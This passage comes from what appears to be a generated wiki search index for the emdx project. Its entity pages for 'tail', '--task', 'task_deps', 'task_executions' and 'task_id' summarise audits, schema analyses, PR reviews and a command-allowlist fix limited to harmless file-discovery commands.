<code>SAFE_DISCOVERY_COMMANDS</code> allowlist containing safe file discovery commands:</li> </ol> </li> <li> <p><code>fd</code>, <code>find</code>, <code>ls</code>, <code>eza</code>, <code>exa</code>, <code>rg</code>, <code>git</code>, <code>locate</code>, <code>tree</code>, <code>echo</code>, <code>cat</code>, <code>head</code>, <code>tail</code>, <code>seq</code></p> </li> <li> <p>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37]   Section: The Fix</p> <ol> <li>Command Allowlist: Only safe discovery commands are permitted:</li> </ol> </li> <li> <p><code>fd</code>, <code>find</code>, <code>git</code>, <code>rg</code>, <code>ls</code>, <code>grep</code>, <code>jq</code>, <code>eza</code>, <code>cat</code>, <code>head</code>, <code>tail</code>, etc.</p> </li> <li> <p>#6265 Delegate: Document #6230 - Security Fix Implementation   Section: Fix Implementation</p> </li> <li><code>fd</code>, <code>find</code>, <code>git</code>, <code>rg</code>, <code>grep</code>, <code>ls</code>, <code>eza</code></li> <li> <p><code>cat</code>, <code>head</code>, <code>tail</code>, <code>sort</code>, <code>uniq</code>, <code>wc</code>, <code>echo</code>, <code>printf</code></p> </li> <li> <p>#6254 Delegate: Fix command injection in --each discovery   Section: The Fix</p> <p>...mands allowed:</p> </li> <li><code>fd</code>, <code>find</code>, <code>git</code>, <code>rg</code>, <code>ls</code>, <code>eza</code>, <code>exa</code>, <code>cat</code>, <code>head</code>, <code>tail</code></li> <li> <p>Path handling: Allows full paths like <code>/usr/bin/fd</code> by checking basename</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 1. MODULES WITH 0% TEST COVERAGE (CRITICAL)</p> <p>....py<code>| \ud83d\udd34 CRITICAL | 10 public functions | Test</code>list_executions<code>,</code>show<code>,</code>logs<code>,</code>tail<code>,</code>kill<code>| |</code>commands/gist.py<code>| \ud83d\udd34 CRITICAL | 6 public functions | Test</code>create<code>,</code>update<code>,</code>copy_to_clipboard<code>, auth flow | |</code>commands/maintain.py` | \ud83d\udd34 CRITICAL |...</p> </li> </ul>"},{"location":"entities/tail/#1-command-allowlist","title":"1. Command Allowlist","text":"<p>Added <code>SAFE_DISCOVERY_COMMANDS</code> frozenset containing only file-listing commands:</p>"},{"location":"entities/tail/#related-entities","title":"Related Entities","text":"<ul> <li><code>head</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.7)</li> <li><code>logs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>echo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>monitor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>killall</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>health</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>kill</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>safe execution</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>main</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>command allowlist</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> </ul>"},{"location":"entities/task/","title":"--task","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-01-15</p>"},{"location":"entities/task/#documents-9","title":"Documents (9)","text":"<ul> <li>#6868 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/task/#synthes-34","title":"Synthes [3/4]","text":"<p>Section: Changes made:</p> <p>Added \u2014 Flags: - <code>--task</code> flag in delegate options reference and usage examples - <code>--wiki</code> and <code>--all-types</code> flags in find options and examples</p> <ul> <li> <p>#6864 Delegate synthesis [synthesis]   Section: Key Findings</p> <p>...subcommands | | <code>emdx task dep/chain/note</code> | 3 task subcommands | | <code>emdx delegate --task</code>, <code>--limit</code> | 2 delegate flags | | <code>emdx find --wiki</code>, <code>--all-types</code> | 2 find flags | | Document links, entities, wiki tables | Database schema |</p> </li> <li> <p>#6842 Delegate: Add a --task flag to the delegate command that sets the EMDX</p> <ol> <li>Added <code>--task</code> CLI option \u2014 <code>typer.Option</code> accepting <code>int | None</code>, placed next to <code>--doc</code> for consistency</li> </ol> </li> <li> <p>Added <code>task_flag</code> parameter to <code>_run_single()</code> and `_run_paralle...</p> </li> <li> <p>#6552 Delegate: Review PR #655 using 'gh pr view 655' and 'gh pr diff 655'.  [3/6]   Section: PR Description</p> <p>Added comprehensive test coverage for the <code>--task</code> and <code>--done</code> flags in <code>emdx save</code> command. These flags were implemented in PR #649 but lacked test coverage.</p> </li> <li> <p>#6538 Delegate: Add missing tests for the --task and --done flags in emdx sa [1/3]   Section: Summary</p> <p>Added comprehensive tests for the <code>--task</code> and <code>--done</code> flags in the <code>emdx save</code> command. These flags were implemented in PR #649 to allow linking saved documents to tasks and optionally marking those tasks as done.</p> </li> <li> <p>#6531 Delegate synthesis [synthesis]   Section: Actionable Items</p> <p>Should Address:</p> </li> <li>#650: Add tests for QAPresenter and streaming logic</li> <li>#649: Add tests for <code>--task</code> and <code>--done</code> save flags</li> <li> <p>#652: Improve worktree cleanup exception safety</p> </li> <li> <p>#6527 Delegate: Review GitHub PR #649 using 'gh pr view 649' and 'gh pr diff [4/4]   Section: Summary</p> <p>This PR adds two new flags to <code>emdx save</code>:</p> </li> <li><code>--task &lt;id&gt;</code>: Links saved document to a task as its output (<code>output_doc_id</code>)</li> <li> <p><code>--done</code>: Marks the linked task as done (requires <code>--task</code>)</p> </li> <li> <p>#5182 Workflow Redesign: Task-Driven Execution   Section: CLI</p> <p>```bash</p> </li> </ul>"},{"location":"entities/task/#strings","title":"Strings","text":"<p>emdx workflow run analysis --task \"Docs audit\" --task \"Dead code\"</p>"},{"location":"entities/task/#related-entities","title":"Related Entities","text":"<ul> <li><code>tests/test_save_task_flags.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>testsavetasknotfound</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>testsavetaskflag</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>testsavedonewithouttask</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>testsavedoneflag</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>pr description</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>pr #655 review: add tests for --task and --done flags (issue #649)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>new file:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>decision merged</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>9 test cases</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/taskdeps/","title":"task_deps","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-01-14</p>"},{"location":"entities/taskdeps/#documents-10","title":"Documents (10)","text":"<ul> <li>#6533 EMDX Future Directions: Agent-First Design [1/4]   Section: 3. Task Tracking Gaps </li> <li>Tasks have statuses: open, active, blocked, done, failed</li> <li>Dependencies exist via <code>task_deps</code> table</li> <li> <p>Delegate tasks are separate from manual tasks</p> </li> <li> <p>#6477 EMDX Task System: Unified Architecture and Simplification Strategy   Section: 1. Core Overlap: Tasks vs Tagged Documents**</p> <p>...priority system | Priority tags (p1, p2, p3) or document field | | Dependencies | <code>task_deps</code> DAG | Could use document relationships |</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 30 Migrations(!!) Creating Tables:</p> <p>...ment_tags` - Tagging system</p> </li> <li><code>executions</code> - Claude execution tracking</li> <li><code>tasks</code>, <code>task_deps</code>, <code>task_log</code> - Work queue</li> <li> <p><code>gists</code> - GitHub gist tracking</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Database Schema (Migration 009 + 010 + 034)</p> <p>CREATE TABLE task_deps (     task_id INTEGER NOT NULL,     depends_on INTEGER NOT NULL,     PRIMARY KEY (task_id, depends_on) );</p> </li> <li> <p>#6172 Delegate: Analyze competing/overlapping concepts in emdx. The system h [8/15]   Section: 2. Tasks System</p> <p>Task Dependencies: <code>task_deps</code> table (task_id, depends_on)</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Task System Architecture</p> <p>...<code>gameplan_id</code>: links to a gameplan document</p> </li> <li><code>depends_on</code>: dependency graph via <code>task_deps</code> table</li> <li> <p>Fields for tracking <code>emdx delegate</code> executions: <code>prompt</code>, <code>execution_id</code>, <code>output_doc_id</code></p> </li> <li> <p>#6166 Delegate: Analyze how tasks integrate with cascade. Read emdx/commands [5/15]   Section: Current State</p> <p>...uses**: open, active, blocked, done, failed</p> </li> <li>Execution model: DAG-based with <code>task_deps</code> table for dependencies</li> <li>Tracking: <code>tasks</code> table + <code>task_executions</code> table</li> <li>Automation: Via <code>emdx delegate</code> which creates task records</li> <li> <p>Features:    -...</p> </li> <li> <p>#6161 Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]   Section: <code>emdx prime</code> \u2014 Session Context Injection</p> <p>...asks** (lines 178-193)</p> </li> <li>Query: Open tasks with no blocking dependencies (uses <code>task_deps</code> table)</li> <li>Fields shown: <code>id</code>, <code>title</code>, <code>description</code> (verbose only), <code>priority</code> (as P0-P4 label)</li> <li>Limit: Top 10, ordered by priority then created_at</li> <li> <p>**Th...</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Overlap Between Delegate's Task Tracking and Task System</p> <p>..._task_id<code>,</code>seq` \u2014 hierarchical structure</p> </li> <li><code>depends_on</code> \u2014 task dependencies (via <code>task_deps</code> table)</li> <li><code>source_doc_id</code> \u2014 input document</li> <li><code>tags</code>, <code>prompt</code>, <code>type</code> \u2014 metadata</li> <li> <p><code>gameplan_id</code>, <code>project</code> \u2014 organization</p> </li> <li> <p>#4848 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Priority 1: Self-Referential Relationships for DAGs</p> <p>The <code>task_deps</code> table demonstrates the most sophisticated pattern:</p> </li> </ul>"},{"location":"entities/taskdeps/#current-state","title":"Current State","text":""},{"location":"entities/taskdeps/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx task create</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>task templates</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>tagged documents</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>relationship='log'</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>no task templates</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>how tasks integrate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>task_log</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>usage patterns</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>stages</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>parallel tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/taskexecutions/","title":"task_executions","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-01-14</p>"},{"location":"entities/taskexecutions/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6477 EMDX Task System: Unified Architecture and Simplification Strategy   Section: 2. Execution Tracking Duplication**</p> <p>...-----|-----------|------------| | Status | <code>tasks.status</code> | <code>executions.status</code> | <code>task_executions.status</code> | | Completion time | <code>tasks.completed_at</code> | <code>executions.completed_at</code> | <code>task_executions.completed_at</code> | | Execution link | <code>tasks.execution_id</code> | \u2014 | `task...</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 30 Migrations(!!) Creating Tables:</p> <p>...ual_runs` - Individual run tracking</p> </li> <li><code>iteration_strategies</code> - Prompt sequences</li> <li> <p><code>task_executions</code> - Join table between tasks and workflows</p> </li> <li> <p>#6185 Gameplan: Simplify Task System for Agent Use   Section: Problem</p> <p>...PI is too complex for agents (dependency DAG, 5-level priority, task log, etc.)</p> </li> <li> <p><code>task_executions</code> table is orphaned from removed workflow system</p> </li> <li> <p>#6172 Delegate: Analyze competing/overlapping concepts in emdx. The system h [8/15]   Section: 4. Delegate/Executions</p> <p>Data Model:</p> </li> <li><code>executions</code> table: id, doc_id, doc_title, status, started_at, completed_at, log_file, exit_code, working_dir, pid</li> <li> <p><code>task_executions</code> table: task_id, execution_id, execution_type, status</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: Overview</p> <p>...table** (via <code>emdx/models/executions.py</code>) - Low-level CLI execution tracking</p> </li> <li><code>task_executions</code> table (via <code>emdx/models/task_executions.py</code>) - Task-to-execution linking </li> <li> <p><code>tasks</code> table (via <code>emdx/models/tasks.py</code>) - High-level delegate task tracking</p> </li> <li> <p>#6169 Delegate: Analyze the task runner service. Read emdx/services/task_run [3/15]   Section: Relationship to <code>emdx delegate</code></p> <p>...nified_executor.UnifiedExecutor.execute()<code>| | **Task Tracking** | Uses</code>tasks<code>+</code>task_executions<code>tables | Uses separate</code>tasks` table for tracking | | Use Case | Long-running tasks in background | Interactive results inline |</p> </li> <li> <p>#6165 Delegate: Audit emdx/models/ and emdx/database/ for dead code. Check:  [3/17]   Section: 3. Dead FK References in Migrations</p> <p>...FOREIGN KEY (workflow_run_id) REFERENCES workflow_runs(id)<code>| |</code>migration_010_add_task_executions<code>| 692 |</code>workflow_run_id INTEGER REFERENCES workflow_runs(id)<code>| |</code>migration_019_add_document_sources<code>| 1131-1139 | Multiple workflow FK references | |</code>migration...</p> </li> <li> <p>#6166 Delegate: Analyze how tasks integrate with cascade. Read emdx/commands [5/15]   Section: Current State</p> <p>...DAG-based with <code>task_deps</code> table for dependencies</p> </li> <li>Tracking: <code>tasks</code> table + <code>task_executions</code> table</li> <li>Automation: Via <code>emdx delegate</code> which creates task records</li> <li>Features: </li> <li>Dependency management with cycle detection</li> <li> <p>Gameplan association (`ga...</p> </li> <li> <p>#4848 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Priority 2: Polymorphic Relationships</p> <p>The <code>task_executions</code> table shows advanced pattern usage:</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Overview</p> <ol> <li>tasks - Core task records with workflow/delegate tracking</li> </ol> </li> <li>task_executions - Join table linking tasks to execution records</li> </ul>"},{"location":"entities/taskexecutions/#related-entities","title":"Related Entities","text":"<ul> <li><code>tasks.execution_id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>tagged documents</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>relationship='log'</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>models/task_executions.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>task_log</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>emdx delegate --doc</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>emdx/models/task_executions.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>workflow_runs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>unified_executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>task update</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/taskid/","title":"task_id","text":"<p>Type: tech_term | Mentioned in: 19 documents | First seen: 2026-01-05</p>"},{"location":"entities/taskid/#documents-19","title":"Documents (19)","text":"<ul> <li>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]   Section: Summary <p>...ngle task JSON output structure showing all fields from <code>SingleResult.to_dict()</code>: <code>task_id</code>, <code>doc_id</code>, <code>output_doc_id</code>, <code>execution_id</code>, <code>exit_code</code>, <code>success</code>, <code>duration_seconds</code>, <code>duration</code></p> </li> <li> <p>Note about optional fields (<code>pr_url</code>, <code>branch_name</code>, <code>error</code>...</p> </li> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: The <code>executions</code> Table Schema (final form)</p> <p>...OS process ID | | <code>cascade_run_id</code> | INTEGER (nullable) | FK to cascade_runs | | <code>task_id</code> | INTEGER (nullable) | FK to tasks table | | <code>cost_usd</code> | REAL DEFAULT 0.0 | Total cost in USD | | <code>tokens_used</code> | INTEGER DEFAULT 0 | Total token count | | `input_...</p> </li> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (B) MUST STAY IN LAUNCHER \u2014 Hooks can't do these</p> <p>...9\u2013514 | Sets <code>EMDX_AUTO_SAVE</code>, <code>EMDX_TITLE</code>, <code>EMDX_TAGS</code>, <code>EMDX_BATCH_FILE</code>, <code>EMDX_TASK_ID</code>, <code>EMDX_EXECUTION_ID</code>, <code>EMDX_DOC_ID</code>. These are the bridge to hooks \u2014 the launcher must set them before the child process starts. | | 8 | **Prompt construction (PR...</p> </li> <li> <p>#6565 Delegate: Look at the synthesis_service.py \u2014 how does --synthesize wor [3/3]   Section: 2. Parallel Execution (_run_parallel, lines 636-861)</p> <p>Each task:</p> </li> <li>Gets an optional per-task worktree (if <code>--worktree</code>)</li> <li>Runs via <code>_run_single()</code> which calls <code>UnifiedExecutor</code></li> <li> <p>Returns a <code>SingleResult</code> with <code>doc_id</code>, <code>task_id</code>, <code>pr_url</code>, etc.</p> </li> <li> <p>#6543 Delegate Enhancement Gameplans [2/5]   Section: Executive Summary</p> <p>...aps the existing <code>execute()</code> call in <code>_run_single()</code> with a retry loop, preserving task_id and respecting future <code>--budget</code> integration.</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...output) | | <code>source_doc_id</code> | INTEGER | NULL | FK to documents (input) | | <code>parent_task_id</code> | INTEGER | NULL | FK to tasks (hierarchy) | | <code>seq</code> | INTEGER | NULL | Sequence in parent group | | <code>retry_of</code> | INTEGER | NULL | FK to tasks (retry chain) | | `er...</p> </li> <li> <p>#6466 Fix: Execution Dataclass Schema-Model Mismatch in EMDX   Section: Missing Fields Identified</p> </li> <li><code>task_id</code> - Links executions back to the creating task</li> <li><code>cost_usd</code> - Tracks API costs in USD</li> <li><code>tokens_used</code> - Total token usage count</li> <li><code>input_tokens</code> - Input token count</li> <li> <p><code>output_tokens</code> - Output token count</p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]   Section: Summary</p> <p>...<code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cascade_run_id</code>, and <code>task_id</code>, but <code>get_execution()</code>, <code>get_recent_executions()</code>, <code>get_running_executions()</code>, and <code>get_stale_executions()</code> do not SELECT or populate these fields.</p> </li> <li> <p>#6277 Delegate: DEBT-2: Fix schema-model mismatch. The Execution dataclass i   Section: DEBT-2: Fix schema-model mismatch in Execution dataclass</p> <ol> <li>Migration 036 columns:</li> </ol> </li> <li><code>task_id</code> - Links execution to tasks</li> <li><code>cost_usd</code> - API cost tracking</li> <li><code>tokens_used</code> - Total token usage</li> <li><code>input_tokens</code> - Input token tracking</li> <li> <p><code>output_tokens</code> - Output token tracking</p> </li> <li> <p>#6268 Delegate: Document #6230 (Migration/Schema Debt Implementation)   Section: 1. Fixed Execution Dataclass (MEDIUM severity)</p> <p>...ations 031 and 036:</p> </li> <li><code>cascade_run_id</code>: Links execution to cascade pipeline run</li> <li><code>task_id</code>: Links execution back to creating task</li> <li><code>cost_usd</code>: Actual cost from Claude API</li> <li><code>tokens_used</code>: Total tokens consumed</li> <li><code>input_tokens</code>: Input tokens</li> <li> <p>`output_tok...</p> </li> <li> <p>#6249 Migration/Schema Debt Fix Implementation [6/14]   Section: Changes Made</p> <p>...issing columns to <code>Execution</code> dataclass:</p> </li> <li><code>cascade_run_id</code> (migration 031)</li> <li><code>task_id</code>, <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code> (migration 036)</li> <li><code>last_heartbeat</code> (migration 037)</li> <li> <p>Refactored all SELECT queries to use shared `_EXE...</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Critical Findings (Immediate Action Required)</p> <p>...Execution<code>dataclass missing 6 columns from migrations 031/036:</code>cascade_run_id<code>,</code>task_id<code>,</code>cost_usd<code>,</code>tokens_used<code>,</code>input_tokens<code>,</code>output_tokens`</p> </li> <li> <p><code>last_heartbeat</code> column queries exist but column was dropped in migration 013</p> </li> <li> <p>#6228 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: 1. MEDIUM: Execution Dataclass Out of Sync with Schema**</p> <p>...---------| | <code>cascade_run_id</code> | 031 | Links execution to cascade pipeline run | | <code>task_id</code> | 036 | Links execution back to creating task | | <code>cost_usd</code> | 036 | Actual cost from Claude API | | <code>tokens_used</code> | 036 | Total tokens consumed | | <code>input_tokens</code>...</p> </li> <li> <p>#6194 Analysis: Delegate + Activity Browser Issues   Section: 6 Issues Found</p> </li> <li>Location: <code>emdx/commands/delegate.py:231</code></li> <li> <p>Problem: Execution created without link back to the creating task. Task gets <code>execution_id</code>...</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>...ble</p> </li> <li><code>output_doc_id</code>: Result document</li> <li><code>source_doc_id</code>: Input document</li> <li><code>parent_task_id</code>: Hierarchical parent</li> <li><code>seq</code>: Sequence number in parent</li> <li><code>retry_of</code>: Previous attempt</li> <li><code>tags</code>: Comma-separated tags</li> <li> <p><code>error</code>: Error message</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 2. Task Executions Table (<code>models/task_executions.py</code>)</p> <p>...| |--------|------|-------------| | <code>id</code> | INTEGER PK | Auto-incrementing ID | | <code>task_id</code> | INTEGER FK | Links to tasks table | | <code>execution_id</code> | INTEGER FK | Links to executions table | | <code>execution_type</code> | TEXT | workflow/direct/manual | | <code>status</code> |...</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Delegate Activity Tracking Fields (added in migration 034)</p> <p>...<code>source_doc_id</code> | INTEGER | NULL | FK to documents (input context doc) | | <code>parent_task_id</code> | INTEGER | NULL | FK to tasks (for child tasks in parallel/chain) | | <code>seq</code> | INTEGER | NULL | Sequence number for ordering children | | <code>retry_of</code> | INTEGER | NUL...</p> </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: Subcommand Analysis</p> </li> <li> <p><code>task_id</code> (required): Task ID</p> </li> <li> <p>#1835 Architecture Analysis: EMDX Control Center v5 Implementation   Section: 1. Database Schema Gaps (Migration 008 needed)</p> <p>...log (COMPLETELY MISSING) work_log (     id INTEGER PRIMARY KEY AUTOINCREMENT,     task_id INTEGER NOT NULL,     gameplan_id INTEGER NOT NULL,     execution_id INTEGER,             -- Link to agent execution     work_type TEXT,                   -- 'manual...</p> </li> </ul>"},{"location":"entities/taskid/#from-migration-036","title":"From Migration 036","text":""},{"location":"entities/taskid/#high-no-task_id-on-execution-record","title":"HIGH: No task_id on execution record","text":""},{"location":"entities/taskid/#3-show-show-task-details","title":"3. <code>show</code> \u2014 Show task details","text":"<p>Arguments:</p>"},{"location":"entities/taskid/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.5)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>execution.is_zombie</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>cascade_run_id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.2)</li> <li><code>get_running_executions()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.2)</li> <li><code>run_task()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, 